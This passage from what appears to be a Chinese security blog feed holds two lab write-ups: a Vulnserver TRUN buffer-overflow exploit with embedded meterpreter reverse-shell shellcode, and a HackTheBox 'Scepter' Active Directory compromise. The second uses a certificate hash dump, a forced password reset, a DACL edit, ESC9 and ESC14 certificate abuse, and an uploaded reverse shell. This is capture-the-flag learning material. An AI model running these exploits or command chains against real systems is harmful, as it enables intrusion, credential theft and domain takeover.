➜  Pildoritas smbclient -L 192.168.56.93 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILUR
```

## Vulnserver

从`nmap` 中的扫描结果能知道搭建着 `Vulnserver`

项目链接：https://github.com/stephenbradshaw/vulnserver

```bash
➜  Pildoritas nc 192.168.56.93 9999 
Welcome to Vulnerable Server! Enter HELP for help.
```

直接从网上找 `POC` ：https://forum.butian.net/share/4013

将里面的`payload` 换成自己的就行

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=1234 -f c -e x86/shikata\_ga\_nai -b "\\x00" -f python -v shellcode
```

```bash
#!/usr/bin/python

import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 9999
    size = 2006

    shellcode = b"\x90" * 20
    
    // 替换
    shellcode += b"\xd9\xc0\xd9\x74\x24\xf4\x58\x31\xc9\xbb\x6b"
    shellcode += b"\xc5\x71\xf0\xb1\x59\x31\x58\x19\x83\xe8\xfc"
    shellcode += b"\x03\x58\x15\x89\x30\x8d\x18\xc2\xbb\x6e\xd9"
    shellcode += b"\xbc\x32\x8b\xe8\xee\x21\xdf\x59\x3e\x21\x8d"
    shellcode += b"\x51\xb5\x67\x26\x5b\x36\x0c\x34\xb3\xc7\xa4"
    shellcode += b"\xf3\xe5\xe6\x0a\xaf\xd6\x69\xf7\xb2\x0a\x49"
    shellcode += b"\xc6\x7c\x5f\x88\x0f\xcb\x15\x65\xdd\x9b\x5e"
    shellcode += b"\x2b\xf2\xa8\x23\xf7\xf3\x7e\x28\x47\x8c\xfb"
    shellcode += b"\xef\x33\x20\x05\x20\x30\xf0\x1d\x4b\x1e\x21"
    shellcode += b"\x1f\x98\xce\xa4\xd6\x6a\xd2\x97\x17\xdb\xa1"
    shellcode += b"\xec\x6c\xdd\x63\x3d\xb3\x1f\x44\x33\x9f\xa1"
    shellcode += b"\x9d\x74\x3f\xd4\xd5\x86\xc2\xef\x2e\xf4\x18"
    shellcode += b"\x65\xb0\x5e\xea\xdd\x14\x5e\x3f\xbb\xdf\x6c"
    shellcode += b"\xf4\xcf\x87\x70\x0b\x03\xbc\x8d\x80\xa2\x12"
    shellcode += b"\x04\xd2\x80\xb6\x4c\x80\xa9\xef\x28\x67\xd5"
    shellcode += b"\xef\x95\xd8\x73\x64\x37\x0e\x03\x85\xc7\x2f"
    shellcode += b"\x59\x11\x0b\xe2\x62\xe1\x03\x75\x10\xd3\x8c"
    shellcode += b"\x2d\xbe\x5f\x44\xe8\x39\xd6\x42\x0b\x95\x50"
    shellcode += b"\x02\xf5\x16\xa0\x0a\x32\x42\xf0\x24\x93\xeb"
    shellcode += b"\x9b\xb4\x1c\x3e\x31\xbf\x8a\x01\x6d\x87\x4f"
    shellcode += b"\xea\x6f\xf8\x4b\x38\xe6\x1e\x03\xec\xa8\x8e"
    shellcode += b"\xe4\x5c\x08\x7f\x8d\xb6\x87\xa0\xad\xb8\x42"
    shellcode += b"\xc9\x44\x57\x3a\xa1\xf0\xce\x67\x39\x60\x0e"
    shellcode += b"\xb2\x47\xa2\x84\x36\xb7\x6d\x6d\x33\xab\x9a"
    shellcode += b"\x0a\xbb\x33\x5b\xbf\xbb\x59\x5f\x69\xec\xf5"
    shellcode += b"\x5d\x4c\xda\x59\x9d\xbb\x59\x9d\x61\x3a\x6b"
    shellcode += b"\xd5\x54\xa8\xd3\x81\x98\x3c\xd3\x51\xcf\x56"
    shellcode += b"\xd3\x39\xb7\x02\x80\x5c\xb8\x9e\xb5\xcc\x2d"
    shellcode += b"\x21\xef\xa1\xe6\x49\x0d\x9f\xc1\xd5\xee\xca"
    shellcode += b"\x51\x11\x10\x88\x7d\xba\x78\x72\x3e\x3a\x78"
    shellcode += b"\x18\xbe\x6a\x10\xd7\x91\x85\xd0\x18\x38\xce"
    shellcode += b"\x78\x92\xad\xbc\x19\xa3\xe7\x61\x87\xa4\x04"
    shellcode += b"\xba\x38\xde\x65\x3d\xb9\x1f\x6c\x5a\xba\x1f"
    shellcode += b"\x90\x5c\x87\xc9\xa9\x2a\xc6\xc9\x8d\x25\x7d"
    shellcode += b"\x6f\xa7\xaf\x7d\x23\xb7\xe5"

    inputBuffer = b"TRUN ." + b"\x41" * size + b"\xaf\x11\x50\x62" + shellcode

    buf = inputBuffer

    print("Sending evil buffer...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
```

运行后成功拿到 `Shell`

![image.png](/post-images/TheHackersLabsPildoritas/image1.png)

直接就是`SYSTEM` 权限

```bash
meterpreter > ls
Listing: C:\Users\Administrador\Desktop
=======================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  282    fil   2024-07-22 00:38:48 +0800  desktop.ini
100666/rw-rw-rw-  1646   fil   2024-07-22 01:00:39 +0800  essfunc.c
100666/rw-rw-rw-  16601  fil   2024-07-22 01:00:11 +0800  essfunc.dll
100666/rw-rw-rw-  36     fil   2024-07-22 01:46:33 +0800  root.txt
100666/rw-rw-rw-  9033   fil   2024-07-22 01:00:31 +0800  vulnserver.c
100777/rwxrwxrwx  29624  fil   2024-07-22 00:59:45 +0800  vulnserver.exe

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > cat root.txt
be3751d9c6dxxxxxxxxxxxxxxxxxxxxxxx  -

meterpreter > cat user.txt
3163xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  -
```

## 总结

不清楚是否是让直接梭哈

还是有预期做法

感觉怪怪的]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Vulnserver</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Scepter]]></title>
            <link>https://www.sunsetaction.top/2025/07/24/HackTheBoxMachine - Scepter</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/24/HackTheBoxMachine - Scepter</guid>
            <pubDate>Sat, 26 Apr 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Scepterl https://app.hackthebox.com/machines/Scepter | Hard PS：一直以为 Season 过了之后就不能白嫖靶机了…导致错过了两周的靶机…呜呜呜 前期踩点 Windows 靶机的端口，但不一定是域控主机（PS:后面才知道我扫...]]></description>
            <content:encoded><![CDATA[# Machine - Scepterl

> https://app.hackthebox.com/machines/Scepter | `Hard`
> 

PS：一直以为 Season 过了之后就不能白嫖靶机了…导致错过了两周的靶机…呜呜呜

## 前期踩点

```bash
➜  Scepter nmap -sT -min-rate 10000 -p- 10.10.11.65        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-24 10:18 EDT
Nmap scan report for 10.10.11.65
Host is up (0.30s latency).
Not shown: 65306 filtered tcp ports (no-response), 224 closed tcp ports (conn-refused)
PORT    STATE SERVICE
53/tcp  open  domain
111/tcp open  rpcbind
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 66.89 seconds
```

`Windows` 靶机的端口，但不一定是域控主机（PS:后面才知道我扫描出来的端口shao）

```bash
➜  Scepter nmap -sT -A -T4 -O -p 53,111,135,139,445 10.10.11.65
Nmap scan report for 10.10.11.65
Host is up (0.40s latency).

PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
111/tcp open  rpcbind?
| rpcinfo:
|   program version    port/proto  service
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  4           2049/tcp   nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Micro
soft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 143
93 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-04-24T22:05:35
|_  start_date: N/A
|_clock-skew: 7h40m16s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   464.44 ms 10.10.16.1
2   291.53 ms 10.10.11.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 251.59 seconds
```

## NFS

```bash
rpcdump.py scepter.htb -target-ip 10.10.11.65
```

很多的信息，尝试从里面获取有用的信息，结果保存在 `rpcdump_resule.txt`

主机为 `DC01.scepter.htb` ，那就能确定是域控了

NMAP 中扫描出了靶机开启了 NFS，尝试一下匿名访问。

```bash
➜  Scepter showmount -e 10.10.11.65
Export list for 10.10.11.65:
/helpdesk (everyone)

➜  Scepter mkdir nfs
➜  Scepter sudo mount -t nfs 10.10.11.65:/helpdesk /root/Desktop/test/Scepter/nfs

➜  Scepter cd nfs   
➜  nfs ls
baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx
```

## To D.baker

使用 openssl 查看 `baker.crt` 的内容

```bash
➜  nfs_backup openssl x509 -in baker.crt -text -noout
Certificate:                                                                                                                                                                                                    
    Data:                                 
        Version: 3 (0x2)                                                                                                                                                                                        
        Serial Number:            
            62:00:00:00:32:e1:a5:c3:91:51:31:09:7b:00:00:00:00:00:32
        Signature Algorithm: sha256WithRSAEncryption 
        Issuer: DC=htb, DC=scepter, CN=scepter-DC01-CA
        Validity                       
            Not Before: Nov  2 01:13:46 2024 GMT                                                        
            Not After : Nov  2 01:13:46 2025 GMT
        Subject: DC=htb, DC=scepter, CN=Users, CN=d.baker, emailAddress=d.baker@scepter.htb
        Subject Public Key Info:         
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)                                         
```

尝试生成 `pfx` 文件，用于认证的密码是 `newpassword` （暂时不知道如何获得，弱密码？），新设置密码为空密码

```bash
➜  nfs_backup openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt
Enter pass phrase for baker.key:
Enter Export Password:
Verifying - Enter Export Password:
```

通过 `certipy-ad` 提取用户 hash

```bash
➜  Scepter sudo ntpdate 10.10.11.65 | certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username d.baker
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: d.baker@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

```bash
aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

检查密码有效性

```bash
➜  Scepter nxc smb 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.65     445    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 
```

```bash
➜  Scepter nxc ldap 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.65     389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 
```

```bash
➜  Scepter bloodhound-python -u 'd.baker' -d 'scepter.htb' -ns 10.10.11.65 --zip -c All -dc 'DC01.scepter.htb' --hashes 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'   
INFO: Found AD domain: scepter.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: DC01.scepter.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.scepter.htb
INFO: Found 11 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.scepter.htb
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 00M 27S
INFO: Compressing output into 20250425062047_bloodhound.zip
```

## To A.carter

### 权限滥用

BloodHound分析，`d.baker` 属于 `STAFF ACCESS CERTICICATE` 的

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image.png)

因为这个关系，`d.baker` 可以修改 `a.carter` 的密码

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image1.png)

修改密码 `123456`

```bash
➜  nfs_backup changepasswd.py 'scepter.htb/a.carter@10.10.11.65' -newpass 123456 -altuser 'd.baker' -althash 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce' -reset
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of scepter.htb\a.carter as scepter.htb\d.baker
[*] Connecting to DCE/RPC as scepter.htb\d.baker
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

检验是否修改成功

```bash
➜  nfs_backup nxc smb 10.10.11.65 -u a.carter -p 123456       
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.65     445    DC01             [+] scepter.htb\a.carter:123456 
```

## To H.brown

通过 BloodHound 查看一下 a.carter 的权限。对 `STAFF ACCESS CERTIFICATE` 有 GenericAll 权限

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image2.png)

赋予 a.carter 对`STAFF ACCESS CERTIFICATE`  `Fullcontrol` 权限

```bash
➜  nfs_backup dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'scepter.htb'/'a.carter':'123456'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250425-071815.bak
[*] DACL modified successfully!
```

```bash
➜  Scepter bloodhound-python -u 'a.carter' -p '123456' -d 'scepter.htb' -ns 10.10.11.65 --zip -c All -dc 'DC01.scepter.htb' 
INFO: Found AD domain: scepter.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: DC01.scepter.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.scepter.htb
INFO: Found 11 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.scepter.htb
INFO: Done in 00M 31S
INFO: Compressing output into 20250425071924_bloodhound.zip
```

粗略一看没找到链子，先找找下一个目标账户，查看了用户后发现 `h.brown` 是远程管理组成员，暂且将其作为目标用户。

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image3.png)

### ESC9

一开始给我们提供的就是证书来获得用户，所以知识点可能在 AD CS

使用 certipy 收集数据

```bash
➜  Scepter certipy-ad find -u a.carter@scepter.htb -p 123456 -dc-ip 10.10.11.65 -bloodhound                                                                                     
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'scepter-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'scepter-DC01-CA' via RRP
[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via RRP: The NETBIOS connection with the remote host timed out.
[!] Failed to get CA configuration for 'scepter-DC01-CA'
[*] Saved BloodHound data to '20250425111914_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
```

ESC4 也有，但是我们当前的用户无法实现。最后发现 `ESC9` 貌似是我们当前可以利用的

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image4.png)

利用链接：https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension

该组织属性：

| 属性 | 值 |
| --- | --- |
| Any Purpose | False |
| Authorized Signatures Required | 0 |
| Certificate Authorities | scepter-DC01-CA |
| Certificate Name Flag | SubjectRequireEmail<br>SubjectRequireDnsAsCn<br>SubjectAltRequireEmail |
| Client Authentication | True |
| Display Name | StaffAccessCertificate |
| Enabled | True |
| Enrollee Supplies Subject | False |
| Enrollment Agent | False |
| Enrollment Flag | NoSecurityExtension<br>AutoEnrollment |
| Extended Key Usage | Client Authentication<br>Server Authentication |
| Minimum RSA Key Length | 2,048 |
| Private Key Flag | 16842752 |
| Renewal Period | 6 weeks |
| Requires Key Archival | False |
| Requires Manager Approval | False |
| Template Name | StaffAccessCertificate |
| Validity Period | 99 years |
| Domain | SCEPTER.HTB |
| Type | Certificate Template |

来自上面的链接：在此方案中，user1 对 user2 具有 `GenericWrite`，并希望入侵 user3。允许 user2 注册一个易受攻击的模板，该模板在 `msPKI-Enrollment-Flag` 值中指定 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。

```bash
certipy-ad shadow auto -username "a.carter@scepter.htb" -p "123456" -account d.baker -dc-ip 10.10.11.65
certipy-ad account update -username "a.carter@scepter.htb" -p "123456" -user d.baker -upn h.brown -dc-ip 10.10.11.65
certipy-ad req -username "d.baker@scepter.htb" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65
certipy-ad account update -username "a.carter@scepter.htb" -p "123456" -user d.baker -upn "d.baker@scepter" -dc-ip 10.10.11.65
certipy-ad auth -pfx 'h.brown.pfx' -domain "scepter.htb" -dc-ip 10.10.11.65
```

执行到第三条的时候出现了如下错误

```bash
➜  ADCS certipy-ad req -username "d.baker@scepter.htb" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
[*] Request ID is 38
Would you like to save the private key? (y/N) Y
[*] Saved private key to 38.key
[-] Failed to request certificate
```

表明在证书申请过程中，**证书颁发请求**中需要包含 **email** 信息，但在你的请求中，**email 信息缺失或无法获取**。具体来说，错误 `CERTSRV_E_SUBJECT_EMAIL_REQUIRED` 指明，证书模板要求在 **Subject** 或 **Subject Alternative Name (SAN)** 中必须包含有效的 email 地址。

询问**佬**们后得知可以通过 `BloodyAD` 来修改，将 d.baker 的

```bash
bloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb
```

那么命令就变为

```bash
certipy-ad shadow auto -username "a.carter@scepter.htb" -p "123456" -account d.baker -dc-ip 10.10.11.65
certipy-ad account update -username "a.carter@scepter.htb" -p "123456" -user d.baker -upn h.brown -dc-ip 10.10.11.65
bloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb
certipy-ad req -username "d.baker@scepter.htb" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65
certipy-ad account update -username "a.carter@scepter.htb" -p "123456" -user d.baker -upn "d.baker@scepter" -dc-ip 10.10.11.65
certipy-ad auth -pfx 'd.baker.pfx' -domain "scepter.htb" -dc-ip 10.10.11.65 -username h.brown
```

最后获得 `h.brown`  的 TGT

```bash
➜  Scepter certipy-ad auth -pfx 'd.baker.pfx' -domain "scepter.htb" -dc-ip 10.10.11.65 -username h.brown
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: h.brown@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```

导入 TGT

```bash
➜  Scepter export KRB5CCNAME=h.brown.ccache 
```

编写 `/etc/krb5.conf`

```bash
➜  Scepter cat /etc/krb5.conf                                                      
[libdefaults]
    default_realm = scepter.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    SCEPTER.HTB = {
        kdc = dc01.scepter.htb
        admin_server = dc01.haze.htb
    }

[domain_realm]
    .scepter.htb = scepter.HTB
    scepter.htb = scepter.HTB
```

使用`evil-winrm`登录

```bash
➜  Scepter ntpdate -s 10.10.11.65 ; evil-winrm -r scepter.htb -i dc01.scepter.htb -u h.brown
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\h.brown\Documents> 
```

终于登录进来了，事不宜迟先读 user.txt

```bash
*Evil-WinRM* PS C:\Users\h.brown\Desktop> type user.txt
4e1f18052814cfb9f26a1497a8bc1cc6
```

收集一波数据

```bash
*Evil-WinRM* PS C:\Users\h.brown\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```bash
*Evil-WinRM* PS C:\Users\h.brown\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                        Attributes
=========================================== ================ ========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                               Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                               Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                               Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group
SCEPTER\CMS                                 Group            S-1-5-21-74879546-916818434-740295365-1601 Mandatory group, Enabled by default, Enabled group
SCEPTER\Protected Users                     Group            S-1-5-21-74879546-916818434-740295365-525  Mandatory group, Enabled by default, Enabled group
SCEPTER\Helpdesk Admins                     Group            S-1-5-21-74879546-916818434-740295365-1105 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Certificate  Well-known group S-1-5-65-1                                 Mandatory group, Enabled by default, Enabled group
```

## To P.adams

### ESC14 - **对 altSecurityIdentities 的写入访问权限**

现在目标用户是 `P.adams`

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image5.png)

枚举用户 `h.brown`  是否有修改某些对象（如组成员关系、ACL 或权限）的能力。

```bash
➜  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k get writable --de
...
distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
altSecurityIdentities: WRITE
```

对 `p.adams` 的 `altSecurityIdentities` 可写

大概是可以利用：https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities | https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9

攻击者对目标的 `altSecurityIdentities` 属性具有写入权限。他可以将证书注册为受害者，并通过修改其 `altSecurityIdentities` 属性并将其指向获取的证书来为目标创建显式映射。然后，可以使用该证书作为目标进行身份验证。

攻击根据：https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9 的 `ESC14`场景`A` 

先使用 h.brown 来进行上线 MSF，后续一些操作在`evil-winrm`中操作会有`bug`

```bash
➜  Scepter msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.59 lport=1234 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

```bash
➜  Scepter msfconsole 
Metasploit tip: View all productivity tips with the tips command

_                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
|/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\

=[ metasploit v6.4.34-dev                          ]
+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]
+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > set lhost 10.10.16.59
lhost => 10.10.16.59
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.59:1234 
```

```bash
*Evil-WinRM* PS C:\Users\h.brown\Documents> upload shell.exe
                                        
Info: Uploading /root/Desktop/test/Scepter/shell.exe to C:\Users\h.brown\Documents\shell.exe
                                        
Data: 98400 bytes of 98400 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\h.brown\Documents> ./shell.exe
```

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.59:1234 
[*] Sending stage (177734 bytes) to 10.10.11.65
[*] Meterpreter session 1 opened (10.10.16.59:1234 -> 10.10.11.65:60515) at 2025-04-26 06:25:04 -0400

meterpreter > 
```

创建计算机账户 `ciallo`

```bash
➜  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 123456 add computer ciallo 123456
[+] ciallo created
```

通过 `certipy` 请求证书

```bash
➜  Scepter certipy-ad req -username "ciallo$" -p 123456 -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'Machine' -dc-ip 10.10.11.65 -debug

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.scepter.htb' at '10.10.11.65'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.65[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.65[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 23
[*] Got certificate with DNS Host Name 'ciallo.scepter.htb'
[*] Certificate object SID is 'S-1-5-21-74879546-916818434-740295365-9104'
[*] Saved certificate and private key to 'ciallo.pfx'
```

将证书转换为`crt`并查看信息

```bash
➜  Scepter certipy-ad cert -pfx ciallo.pfx -nokey -out ciallo.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'ciallo.crt'
```

```bash
➜  Scepter openssl x509 -in ciallo.crt -noout -serial -issuer
serial=620000001B02CCD1DA2D79435E00000000001B
issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA
```

我们使用证书中的序列号和颁发者 `distinguishedName` 来获取 `X509IssuerSerialNumber` 映射格式

使用 GPT 来根据脚本：https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1 改编为 Python 脚本，并运行。

```bash
import argparse

def convert(serial, issuer):
